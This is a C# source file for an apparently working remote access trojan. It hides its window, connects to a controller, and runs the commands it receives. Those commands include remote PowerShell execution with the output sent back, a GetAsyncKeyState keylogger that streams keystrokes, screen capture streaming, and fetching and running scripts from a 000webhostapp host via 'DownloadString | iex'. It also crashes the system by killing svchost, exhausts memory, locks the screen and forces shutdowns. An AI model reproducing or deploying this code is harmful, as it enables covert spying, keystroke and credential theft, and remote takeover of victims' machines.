using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Speech;
using System.Speech.Synthesis;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;

using System.Runtime.InteropServices;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.Diagnostics;
using System.IO;
using System.Drawing.Imaging;


namespace WindowsFormsApp26
{
    public partial class Form1 : Form
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public int togive = 1;
        public static Socket sck = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        public int contin = 1;
        public IPEndPoint localEndPoint;
        private TcpClient client;
        public string poi = "27.0.0";
        private NetworkStream mainStream;
        private int portNumber;
        public string read;
        public string na = ".1";
        public int bona = 1;

        public string myip;
        public byte[] toSendt;

        public List<byte[]> list1;
        public int upcount;
        public double times;

        public int GlobalInt = 0;
        public string mams;
        public string num = "1";
        public string ipaddr;

        public string port;
        public string myUsername;


        public Form1()
        {

            InitializeComponent();
            myUsername = Environment.UserName;
            string path1 = @"C:\Users\"+ myUsername + @"\Documents\ip.txt";
            var fs = new FileStream(path1, FileMode.Open, FileAccess.Read);
            var sr = new StreamReader(fs, Encoding.UTF8);

            ipaddr = sr.ReadToEnd();

            string path2 = @"C:\Users\" + myUsername + @"\Documents\port.txt";
            var fs2 = new FileStream(path2, FileMode.Open, FileAccess.Read);
            var sr2 = new StreamReader(fs2, Encoding.UTF8);

            port = sr2.ReadToEnd();

            backgroundWorker1.WorkerSupportsCancellation = true;
            this.Load += backgroundWorker1_DoWork;
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;

            if (ipaddr != num + poi + na)
            {
                this.Close();
            }
        }


        private void Form1_Load(object sender, EventArgs e)
        {

            

        }


        

            private void backgroundWorker1_DoWork(object sender, EventArgs e)
            {




        starte:
            contin = 1;
            //   localEndPoint = null;
            //   sck.Close();
            //   sck = null;
            if (bona == 1)
            {
                localEndPoint = new IPEndPoint(IPAddress.Parse(ipaddr), int.Parse(port));
                sck = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                try
                {
                    Thread.Sleep(500);
                             sck.Connect(localEndPoint);
                    bona = 0;

                }
                catch (Exception ex)
                {
                    
                    goto starte;
                }
            }


            //            backgroundWorker1.RunWorkerAsync();


            





            try {
                while (sck.Connected)
                {
                    try
                    {
                        string lonomo = "";
                        sck.Send(Encoding.ASCII.GetBytes(lonomo));
                    }catch
                    {
                        bona = 1;
                        goto starte;
                    }
                    int size = 0;
                    byte[] msg = new byte[1024];


                    size = sck.Receive(msg);


                    read = System.Text.Encoding.ASCII.GetString(msg, 0, size);

                    if (!(sck.Connected))
                    {
                        goto starte;

                    }
                    try
                    {

                        if(read.StartsWith("pubip"))
                        {
                            string strIP;
                            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
                            using (WebResponse response = request.GetResponse())
                            using (StreamReader sr = new StreamReader(response.GetResponseStream()))
                            {
                                strIP = sr.ReadToEnd();
                            }
                            //scrape ip from the html
                            int i1 = strIP.IndexOf("Address: ") + 9;
                            int i2 = strIP.LastIndexOf("</body>");
                            strIP = strIP.Substring(i1, i2 - i1);
                            Thread.Sleep(50);
                            sck.Send(Encoding.ASCII.GetBytes(strIP));

                        }

                        if(read.StartsWith("privateip"))
                        {
                            
                            string hostname = Dns.GetHostName();//בשביל האייפי

                            try
                            {
                                myip = Dns.GetHostByName(hostname).AddressList[1].ToString();//מנסה להשיג את האייפי השני ברשימה
                            }
                            catch
                            {
                                myip = Dns.GetHostByName(hostname).AddressList[0].ToString(); //אם אין אז את האייפי הראשון
                            }

                            sck.Send(Encoding.ASCII.GetBytes(myip));
                        }





                        if (read.StartsWith("username"))
                        {
                            string myip;
                            string hostname = Dns.GetHostName();//שם משתמש


                            sck.Send(Encoding.ASCII.GetBytes(hostname));
                        }


                      





                        if (read.StartsWith("mess")) //במידה ואנחנו רוצים לבצע פקודת מסגבוקס
                        {

                            try
                            {
                                backgroundWorker5.WorkerSupportsCancellation = true;
                                backgroundWorker5.RunWorkerAsync();
                                contin = 0;
                                break;
                            }
                            catch { }

                        }


                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }





                    if (read.StartsWith("chat"))
                    {

                        try
                        {
                            Chat chat = new Chat();
                            chat.sck = sck;
                            chat.ShowDialog();

                        }
                        catch { }

                    }







                    try
                    {
                        string lonomo = "";
                        sck.Send(Encoding.ASCII.GetBytes(lonomo));
                    }
                    catch
                    {
                        bona = 1;
                        goto starte;
                    }

                    try
                    {
                        if (read.StartsWith("site")) //במידה ואנחנו רוצים לבצע פקודת הפעלת אתר
                        {
                            string toEXE1 = read;

                            int g1 = read.IndexOf("site ") + 5;
                            int g2 = read.LastIndexOf("1");
                            read = read.Substring(g1, g2 - g1);

                            try
                            {
                                System.Diagnostics.Process.Start(read);


                            }
                            catch (Exception ex) { Console.WriteLine(ex.Message); }

                        }
                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }




                    try
                    {
                        string lonomo = "";
                        sck.Send(Encoding.ASCII.GetBytes(lonomo));
                    }
                    catch
                    {
                        bona = 1;
                        goto starte;
                    }



                    try
                    {
                        if (read.StartsWith("exit")) //במידה ואנחנו רוצים לבצע פקודת יציאה
                        {


                            int g1 = read.IndexOf("exit ") + 5;
                            int g2 = read.LastIndexOf("1");
                            string mes = read.Substring(g1, g2 - g1);



                            try
                            {





                                string strCmdText;
                                strCmdText = "/C taskkill /f /im " + mes;
                                System.Diagnostics.Process.Start("CMD.exe", strCmdText);










                            }
                            catch (Exception ex) { Console.WriteLine(ex.Message); }

                        }

                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }







                    try
                    {
                        if (read.StartsWith("murder")) //במידה ואנחנו רוצים לבצע פקודת יציאה
                        {
                            int g1 = read.IndexOf("murder ") + 7;
                            int g2 = read.LastIndexOf("1");
                            string mes = read.Substring(g1, g2 - g1);

                            Process p = new Process();
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.FileName = "powershell.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.Verb = "runas";
                            p.StartInfo.Arguments = "/C taskkill /f /im " + mes + ".exe";
                            p.Start();

                        }
                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }




                    try
                    {
                        if (read.StartsWith("taskmgr")) //במידה ואנחנו רוצים לבצע פקודת יציאה
                        {

                            try
                            {
                                Thread.Sleep(50);

                                Process[] proc;


                                proc = Process.GetProcesses();
                                int i = 0;
                                foreach (Process p in proc)
                                {
                                    Thread.Sleep(2);
                                    sck.Send(Encoding.ASCII.GetBytes(p.ProcessName + "" +
                                        ""));
                                    Thread.Sleep(2);
                                    sck.Send(Encoding.ASCII.GetBytes(p.ProcessName + "" +
                                        ""));
                                }

                                
                            }
                            catch
                            {
                                bona = 1;

                            }


                            

                        }
                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }













                    try
                    {
                        string lonomo = "";
                        sck.Send(Encoding.ASCII.GetBytes(lonomo));
                    }
                    catch
                    {
                        bona = 1;
                        goto starte;
                    }


                    try
                    {
                        if (read.StartsWith("crash")) //במידה ואנחנו רוצים לבצע פקודת יציאה
                        {

                            try
                            {






                                Process proc = new Process();
                                ProcessStartInfo info = new ProcessStartInfo()
                                {
                                    FileName = "Powershell.exe",
                                    Arguments =
                                "taskkill /f /im svchost.exe",
                                    CreateNoWindow = true,
                                    UseShellExecute = true,
                                    WindowStyle = ProcessWindowStyle.Hidden,
                                    Verb = "runas"
                                };

                                proc.StartInfo = info;
                                proc.Start();











                            }
                            catch (Exception ex) { Console.WriteLine(ex.Message); }

                        }

                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }

                    try
                    {
                        string lonomo = "";
                        sck.Send(Encoding.ASCII.GetBytes(lonomo));
                    }
                    catch
                    {
                        bona = 1;
                        goto starte;
                    }







                    try
                    {
                        if(read.StartsWith("Logout"))
                        {
                            Environment.Exit(0);
                        }
                    }catch
                    {

                    }





                    try
                    {


                        if (read.StartsWith("revshell")) //במידה ואנחנו רוצים לבצע פקודת רברס של
                        {


                            int g1 = read.IndexOf("revshell ") + 9;
                            int g2 = read.LastIndexOf("1");
                            string mes = read.Substring(g1, g2 - g1);
                            Console.WriteLine(mes);


                            Process p = new Process();
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.FileName = "powershell.exe";
                            p.StartInfo.Arguments = "/C " + mes;
                            p.Start();

                            string output = p.StandardOutput.ReadToEnd();
                            p.WaitForExit();
                            byte[] toSend = Encoding.ASCII.GetBytes(output);
                            sck.Send(toSend);



                        }
                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }




                    try
                    {
                        string lonomo = "";
                        sck.Send(Encoding.ASCII.GetBytes(lonomo));
                    }
                    catch
                    {
                        bona = 1;
                        goto starte;
                    }
                    try
                    {


                        if (read.StartsWith("voice")) //במידה ואנחנו רוצים לבצע פקודת מחשב מדבר
                        {
                            try
                            {
                                speak.WorkerSupportsCancellation = true;
                                speak.RunWorkerAsync();
                                contin = 0;
                                break;
                            }
                            catch { }




                        }
                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }


                    try {
                        if (read.StartsWith("idleTime"))
                        {
                            Process p = new Process();
                            p.StartInfo.FileName = "powershell.exe";
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.Verb = "runas";
                            string idleTime = @"((New-object Net.WebClient).DownloadString('https://myproject054.000webhostapp.com/idleTime.txt') | iex)";
                            p.StartInfo.Arguments = idleTime;
                            p.Start();
                            p.WaitForExit();
                            p.Close();

                            Thread.Sleep(10);

                            string txtFile = @"C:\Users\" + myUsername + @"\Documents\idleTime.txt";

                            var fs = new FileStream(txtFile, FileMode.Open, FileAccess.Read);
                            var sr = new StreamReader(fs, Encoding.UTF8);

                            string output = sr.ReadToEnd();
                            fs.Close();
                            sr.Close();
                            sck.Send(Encoding.ASCII.GetBytes(output));
                            sck.Send(Encoding.ASCII.GetBytes(output));
                        }
                    }catch
                    {

                    }


                    try
                    {
                        if (read.StartsWith("currentWindow"))
                        {
                            Process p = new Process();
                            p.StartInfo.FileName = "powershell.exe";
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.Verb = "runas";
                            string idleTime = @"((New-object Net.WebClient).DownloadString('https://myproject054.000webhostapp.com/currentWindow.txt') | iex)";
                            p.StartInfo.Arguments = idleTime;
                            p.Start();
                            p.WaitForExit();
                            p.Close();

                            Thread.Sleep(10);

                            string txtFile = @"C:\Users\" + myUsername + @"\Documents\currentWindow.txt";

                            var fs = new FileStream(txtFile, FileMode.Open, FileAccess.Read);
                            var sr = new StreamReader(fs, Encoding.UTF8);

                            string output = sr.ReadToEnd();
                            fs.Close();
                            sr.Close();
                            sck.Send(Encoding.ASCII.GetBytes(output));
                            sck.Send(Encoding.ASCII.GetBytes(output));
                        }
                    }
                    catch
                    {

                    }







                    try
                    {
                        string lonomo = "";
                        sck.Send(Encoding.ASCII.GetBytes(lonomo));
                    }
                    catch
                    {
                        bona = 1;
                        goto starte;
                    }
                    try
                    {


                        if (read.StartsWith("Keylogger")) //במידה ואנחנו רוצים לבצע פקודת מחשב מדבר
                        {
                            GlobalInt = 0;

                            backgroundWorker2.WorkerSupportsCancellation = true;
                            backgroundWorker2.RunWorkerAsync();

                            
                            backgroundWorker6.WorkerSupportsCancellation = true;
                            backgroundWorker6.RunWorkerAsync();
                            contin = 0;
                            break;


                            

                        }




                        
                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }












                    try
                    {
                        string lonomo = "";
                        sck.Send(Encoding.ASCII.GetBytes(lonomo));
                    }
                    catch
                    {
                        bona = 1;
                        goto starte;
                    }
















                    try
                    {
                        string lonomo = "";
                        sck.Send(Encoding.ASCII.GetBytes(lonomo));
                    }
                    catch
                    {
                        bona = 1;
                        goto starte;
                    }






                    try
                    {


                        if (read.StartsWith("explorerOFF")) //במידה ואנחנו רוצים לבצע פקודת יציאה
                        {


                            Process p = new Process();
                            // Redirect the output stream of the child process.
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.Arguments = "/C taskkill /f /im explorer.exe";
                            p.Start();






                        }
                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }








                    try
                    {
                        string lonomo = "";
                        sck.Send(Encoding.ASCII.GetBytes(lonomo));
                    }
                    catch
                    {
                        bona = 1;
                        goto starte;
                    }







                    try
                    {
                        if (read.StartsWith("shutdown"))
                        {
                            Process p = new Process();
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.FileName = "powershell.exe";
                            string arug = "shutdown /s /t 1";
                            p.StartInfo.Arguments = arug;
                            p.Start();
                        }
                    }
                    catch { }

                    try
                    {
                        if (read.StartsWith("restart"))
                        {
                            Process p = new Process();
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.FileName = "powershell.exe";
                            string arug = "shutdown /r /t 1";
                            p.StartInfo.Arguments = arug;
                            p.Start();
                        }
                    }
                    catch { }




                    try
                    {
                        if (read.StartsWith("ah1"))
                        {
                            Process p = new Process();
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.FileName = "powershell.exe";
                            WebClient web2;
                            using (web2 = new WebClient()) ;
                            string arug = web2.DownloadString("https://myproject054.000webhostapp.com/autohide_on.sparta");
                            p.StartInfo.Arguments = arug;
                            p.Start();
                        }
                    }
                    catch { }





                    try
                    {
                        if (read.StartsWith("taskbar_lock"))
                        {
                            //lock taskbar
                            Process p = new Process();
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.CreateNoWindow= true;
                            string command = @"&{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced';$v=(Get-ItemProperty -Path $p).TaskbarSizeMove;$v=0;&Set-ItemProperty -Path $p -Name TaskbarSizeMove -Value $v;&Stop-Process -f -ProcessName explorer}";
                            p.StartInfo.Arguments = command;
                            p.StartInfo.FileName = "powershell.exe";
                            p.Start();

                        }

                    }
                    catch { }



                    try
                    {
                        if (read.StartsWith("taskbar_unlock"))
                        {
                            //unlock taskbar
                            Process p = new Process();
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.CreateNoWindow = true;
                            string command = @"&{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced';$v=(Get-ItemProperty -Path $p).TaskbarSizeMove;$v=1;&Set-ItemProperty -Path $p -Name TaskbarSizeMove -Value $v;&Stop-Process -f -ProcessName explorer}";
                            p.StartInfo.Arguments = command;
                            p.StartInfo.FileName = "powershell.exe";
                            p.Start();

                        }

                    }
                    catch { }



                    try
                    {
                        if (read.StartsWith("taskbar_top"))
                        {
                            

                            Process p = new Process();
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.FileName = "powershell.exe";
                            string command = @"&{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3';$v=(Get-ItemProperty -Path $p).Settings;$v[12]=1;&Set-ItemProperty -Path $p -Name Settings -Value $v;&Stop-Process -f -ProcessName explorer}";
                            p.StartInfo.Arguments = command;
                            p.Start();


                        }

                    }
                    catch { }



                    try
                    {
                        if (read.StartsWith("taskbar_down"))
                        {
                            Process p = new Process();
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.FileName = "powershell.exe";
                            string command = @"&{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3';$v=(Get-ItemProperty -Path $p).Settings;$v[12]=3;&Set-ItemProperty -Path $p -Name Settings -Value $v;&Stop-Process -f -ProcessName explorer}";
                            p.StartInfo.Arguments = command;
                            p.Start();

                        }

                    }
                    catch { }





                    try
                    {
                        if (read.StartsWith("taskbar_right"))
                        {
                            Process p = new Process();
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.FileName = "powershell.exe";
                            string command = @"&{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3';$v=(Get-ItemProperty -Path $p).Settings;$v[12]=2;&Set-ItemProperty -Path $p -Name Settings -Value $v;&Stop-Process -f -ProcessName explorer}";
                            p.StartInfo.Arguments = command;
                            p.Start();

                        }

                    }
                    catch { }



                    try
                    {
                        if (read.StartsWith("taskbar_left"))
                        {
                            Process p = new Process();
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.FileName = "powershell.exe";
                            string command = @"&{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3';$v=(Get-ItemProperty -Path $p).Settings;$v[12]=0;&Set-ItemProperty -Path $p -Name Settings -Value $v;&Stop-Process -f -ProcessName explorer}";
                            p.StartInfo.Arguments = command;
                            p.Start();

                        }

                    }
                    catch { }













                    try
                    {
                        if (read.StartsWith("ah0"))
                        {
                            Process p = new Process();
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.FileName = "powershell.exe";
                            WebClient web2;
                            using (web2 = new WebClient()) ;
                            string arug = web2.DownloadString("https://myproject054.000webhostapp.com/autohide_off.sparta");
                            p.StartInfo.Arguments = arug;
                            p.Start();
                        }
                    }
                    catch { }


                    try
                    {
                        if (read.StartsWith("paint"))
                        {
                            Paint form = new Paint();
                            form.ShowDialog();
                        }
                    }
                    catch { }



                    try
                    {


                        if (read.StartsWith("explorerON")) //במידה ואנחנו רוצים לבצע פקודת יציאה
                        {


                            Process p = new Process();
                            // Redirect the output stream of the child process.
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;

                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.Arguments = "/C shutdown /r /t 1";
                            p.Start();






                        }
                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }


                        


                    try
                    {
                        string lonomo = "";
                        sck.Send(Encoding.ASCII.GetBytes(lonomo));
                    }
                    catch
                    {
                        bona = 1;
                        goto starte;
                    }



                    try
                    {


                        if (read.StartsWith("ScreenShare")) //במידה ואנחנו רוצים לבצע פקודת יציאה
                        {
                            client = null;
                            client = new TcpClient();


                            portNumber = 443;

                            string ip = ipaddr;
                            while (true)
                            {
                                try
                                {
                                    client.Connect(ip, portNumber);
                                    contin = 0;
                                    break;
                                }catch
                                { }
                            }

                            //      sck.Close();
                            //      sck = null;


                            //read = null;
                            if (!(InvokeRequired))
                                timer1.Start();
                            else
                                this.BeginInvoke((MethodInvoker)(() => timer1.Start()));

                            contin = 0;
                            break;


                        }
                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }









                    try
                    {


                        if (read.StartsWith("ram")) //במידה ואנחנו רוצים לבצע פקודת רצח עם (ראם)י
                        {
                            bona = 0;
                            upcount = 1000;

                            int size1 = 0;
                            byte[] msg1 = new byte[1024];


                            size1 = sck.Receive(msg1);

                            string reader = System.Text.Encoding.ASCII.GetString(msg1, 0, size1);
                            double memoey = int.Parse(reader);
                            times = 1000 * memoey;

                            //100,000 = 100MB
                            //1,000,000 = 1GB

                            Thread.Sleep(50);
                            //Thread thread1 = new Thread(new ThreadStart(tred1));


                            //thread1.Start();

                            backgroundWorker3.WorkerSupportsCancellation = true;
                            backgroundWorker3.RunWorkerAsync();
                            contin = 0;
                            break;





                        }
                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }















                    try
                    {


                        if (read.StartsWith("stopp")) //במידה ואנו רוצים לבטל את הרציחת עם
                        {
                            try
                            {
                                backgroundWorker3.CancelAsync();
                            }
                            catch { }
                            try
                            {
                                list1.Clear();
                            }
                            catch {  }






                        }
                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }


                    try
                    {


                        if (read.StartsWith("lock")) //נעילת המסך
                        {

                            int g1 = read.IndexOf("lock ") + 5;
                            int g2 = read.LastIndexOf("1");
                            string mes = read.Substring(g1, g2 - g1);

                            Form2 form = new Form2();
                            form.key = mes;
                            form.ShowDialog();




                        }
                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }





                    try
                    {
                        string lonomo = "";
                        sck.Send(Encoding.ASCII.GetBytes(lonomo));
                    }
                    catch
                    {
                        bona = 1;
                        goto starte;
                    }

                }
                try
                {
                    if (contin != 0)
                    {
                        bona = 1;
                        goto starte;
                    }
                    else
                    {
                        backgroundWorker1.CancelAsync();
                    }
                }
                catch { }
            }
            catch 
            {
                bona = 1;
                goto starte;
                
            }


            




        }






       

        private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
        {
            while (sck.Connected)
            {
                int size = 0;
                byte[] read = new byte[1024];
                size = sck.Receive(read);
                if (Encoding.ASCII.GetString(read, 0, size) == "stopplease")
                {
                    GlobalInt = 1;
                    contin = 0;
                    break;
                }
                

            }
            GlobalInt = 1;
            backgroundWorker6.CancelAsync();
            backgroundWorker2.CancelAsync();
            backgroundWorker1.RunWorkerAsync();



        }






        private void timer1_Tick(object sender, EventArgs e)
        {
            
            if (togive == 1)
            {
                if (!(InvokeRequired))
                    SendDesktopImage1();
                else
                    this.BeginInvoke((MethodInvoker)(() => SendDesktopImage1()));
            }
           // if(togive == 0)
          //  {
          //      SendDesktopImage2();
         //   }
        }

        private Image GrabDesktop()
        {
            
            Rectangle bound = Screen.PrimaryScreen.Bounds;
            Bitmap screenshot = new Bitmap(bound.Width, bound.Height, PixelFormat.Format32bppArgb);

            
            
                
                Graphics graphics = Graphics.FromImage(screenshot);
                graphics.CopyFromScreen(bound.X, bound.Y, 0, 0, bound.Size, CopyPixelOperation.SourceCopy);


                return screenshot;
            
            
            


        }

        private void SendDesktopImage1()
        {

            //togive++;
            try
            {

                

                BinaryFormatter binFormatter = new BinaryFormatter();

                mainStream = client.GetStream();
                string lonomo = " ";
                StreamWriter swr = new StreamWriter(mainStream);
                swr.Write(Encoding.ASCII.GetBytes(lonomo));

                binFormatter.Serialize(mainStream, GrabDesktop());
            }
            catch
            {
                timer1.Stop();
                togive = 1;
                client.Close();
                mainStream.Close();
                mainStream=null;


                bona = 0;
                backgroundWorker1.RunWorkerAsync();
                

            }
        }





        private void SendDesktopImage2()
        {
            //togive++;
            try
            {



                BinaryFormatter binFormatter = new BinaryFormatter();

                mainStream = client.GetStream();
                string lonomo = " ";
                StreamWriter swr = new StreamWriter(mainStream);
                swr.Write(Encoding.ASCII.GetBytes(lonomo));

                binFormatter.Serialize(mainStream, GrabDesktop());
            }
            catch
            {
                timer1.Stop();
                togive = 1;
                client.Close();
                mainStream.Close();
                mainStream = null;

                bona = 0;
                backgroundWorker1.RunWorkerAsync();
                

            }
        }

        private void backgroundWorker3_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                backgroundWorker1.CancelAsync();
            }
            catch { }
            list1 = new List<byte[]>();
            list1.Clear();
            
            for (int i = 0; i <= times; i++)
                {
                byte[] bata = new byte[upcount];
                list1.Add(bata);

                    double result = i / 1000;
                }

            
            backgroundWorker1.RunWorkerAsync();
            
        }

        private void backgroundWorker4_DoWork(object sender, DoWorkEventArgs e)
        {
            int sizee = 0;
            byte[] buffer = new byte[5000];
            string toRead;

            while (sck.Connected)
            {
                sizee = sck.Receive(buffer);
                toRead = Encoding.ASCII.GetString(buffer, 0, sizee);
                if (toRead.StartsWith("end"))
                {
                    GlobalInt = 1;
                    contin = 0;
                    break;
                    
                }
            }


        }

        private void speak_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                int g1 = read.IndexOf("voice ") + 6;
                int g2 = read.LastIndexOf("1");
                string mes = read.Substring(g1, g2 - g1);
                Console.WriteLine(mes);



                SpeechSynthesizer synth = new SpeechSynthesizer();
                synth.SetOutputToDefaultAudioDevice();
                synth.Speak(mes);
                bona = 0;
                backgroundWorker1.RunWorkerAsync();
                speak.CancelAsync();
            }
            catch { }
        }

        private void backgroundWorker5_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                string title = "Sparta.";


                int g1 = read.IndexOf("mess ") + 4;
                int g2 = read.LastIndexOf("1");
                string mes = read.Substring(g1, g2 - g1);



                try
                {
                    MessageBox.Show(mes, title, 0);



                }
                catch (Exception ex) { Console.WriteLine(ex.Message); }
                bona = 0;
                backgroundWorker1.RunWorkerAsync();
                backgroundWorker5.CancelAsync();
            }
            catch { }
        }

        private void backgroundWorker6_DoWork(object sender, DoWorkEventArgs e)
        {
            
        before:
                if (GlobalInt == 0)
            {
                try
                {
                    Thread.Sleep(10);
                    for (int i = 32; i < 127; i++)
                    {
                        
                        int KeyState = GetAsyncKeyState(i);
                        if (KeyState == 32768)
                        {
                            char chare = (char)i;
                            string test = chare.ToString();
                            if (test == "g")
                            {

                            }
                            else
                            {
                                sck.Send(Encoding.ASCII.GetBytes(test));
                            }


                        }
                    }
                    goto before;
                }
                catch { }
            }

            
        }
    }
}

